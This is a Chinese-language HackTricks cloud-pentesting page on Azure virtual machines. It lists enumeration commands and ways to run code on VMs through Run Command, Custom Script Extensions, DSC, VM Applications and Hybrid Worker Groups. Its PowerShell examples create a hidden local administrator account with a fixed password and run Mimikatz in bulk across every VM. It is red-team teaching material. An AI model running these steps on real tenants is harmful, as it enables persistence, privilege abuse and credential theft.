# Az - 虚拟机 & 网络

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

[来自文档：](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure虚拟机是Azure提供的几种[按需、可扩展的计算资源](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)之一。通常，当您需要比其他选择提供的计算环境更多控制权时，您会选择虚拟机。本文提供了有关在创建虚拟机之前应考虑的事项、如何创建虚拟机以及如何管理虚拟机的信息。

## Azure网络信息

Azure网络包含**不同的实体和配置方式**。您可以在以下位置找到不同Azure网络实体的**简要描述**、**示例**和**枚举**命令：

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure堡垒机

**Azure堡垒机**提供了一个安全的、完全托管的RDP（远程桌面协议）和SSH（安全外壳）访问解决方案，通过Azure门户在SSL上进行。它集成在Azure虚拟网络中，允许使用私有IP的VM进行RDP和SSH连接，避免了需要公共IP的情况。这使其成为传统方法的更安全、更便捷的替代方案，传统方法涉及为VM访问分配公共IP和NSG规则配置。开发人员和IT人员可以通过他们的Web浏览器从Azure门户安全访问VM，简化了开发和测试环境的流程。

要列出订阅中的所有Azure堡垒主机，您可以使用以下命令：

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
## VM枚举
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **在虚拟机中运行命令**

### **在VM中进行AAD登录**

可以允许通过AzureAD进行身份验证的用户访问。例如，尝试访问**Linux VM**：`ssh username@azure-corp.com@1.1.1.1`（重要的是**使用在尝试登录时使用的azurecorp的电子邮件**），可能会出现错误：
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

只需**按照以下说明**前往 [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) 并输入代码，使用电子邮件和密码作为凭据，然后您就可以通过 SSH 连接（如果该用户具有足够的权限进行操作：`Virtual Machine Administrator Login` 或 `Virtual Machine User Login` 角色）。

### **运行命令**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **运行自定义脚本扩展**

Azure虚拟机（VM）扩展是提供在Azure VM上进行部署后配置和自动化任务的**小型应用程序**。例如，如果虚拟机需要软件安装、防病毒保护或在其中运行脚本的能力，您可以使用VM扩展。

因此，如果您有写入权限，您可以执行任意代码：
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC)是类似于Ansible的PowerShell工具，用于通过代码设置主机。DSC与Azure集成，允许上传特定配置文件。这些文件必须遵循严格的语法。值得注意的是，Azure中的DSC扩展可以执行来自符合特定格式标准的文件的命令，即使语法不符合DSC标准，如所示的图中所示。

这些命令的执行由Az PowerShell中的[**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0)函数实现。要求包括一个具有定义函数的**.PS1**文件，并且该文件必须被压缩成**.zip**文件。即使语法可能不符合DSC的要求，代码仍将执行。但是，扩展将标记执行状态为“失败”，由于状态被失败消息覆盖，因此不会显示命令的任何输出。

### VM Application Definitions

VM应用程序定义允许将经过版本化的应用程序重复部署到Azure VM。此资源支持在VM之间部署和更新应用程序。要设置此功能，需要执行几个步骤，涉及Az PowerShell中的**`New-AzGalleryApplication`**和**`New-AzGalleryApplicationVersion`**等命令。

通过此方法执行应用程序或命令涉及**“VMAppExtension”**，当将应用程序应用于VM时，此扩展会自动安装。该扩展从指定的URI检索文件，并将其命名为应用程序的名称，不带扩展名。为了正确执行文件，必须配置REST API调用中的“ManageActions”字段以使用适当的扩展名重命名文件。一旦完成此方法的设置，其结构将类似于提供的图中所示。

然而，此执行方法相对较慢，大约需要3-4分钟来执行一个应用程序或命令。与此过程相关的文件存储在特定目录中（`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`用于应用程序复制，`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`用于执行状态）。

这两种技术提供了在Azure环境中执行命令和部署应用程序的独特方法，每种方法都有自己的一组要求、步骤和注意事项。

### Azure中的混合工作组（HWGs）

[**混合工作组（HWGs）**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker)是Azure中的一个功能，允许在配置在自动化帐户中的Runbook在指定HWG的Azure虚拟机（VM）上执行。此执行通过安装在VM上的扩展实现，该扩展将Runbook代码部署到VM上。此过程的一个重要方面是实际凭据不影响执行，因为代码以特权身份，具体为**SYSTEM**或root运行，如提供的图中所示。

对于使用Windows 10 VM的用户的一个关键细节是需要为Runbook指定PowerShell版本。应将其设置为以PowerShell版本5.1运行，而不是7.1。这一要求源于Windows 10 VM上默认未安装PowerShell 7.1，如果指定了版本7.1，则会导致脚本执行失败。

Azure的此功能提供了一种强大的方法，用于在混合环境中自动化和管理任务，允许在Azure VM上集中管理和执行任务。


## 参考资料

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现我们的独家[NFTs收藏品**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**上关注**我们。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
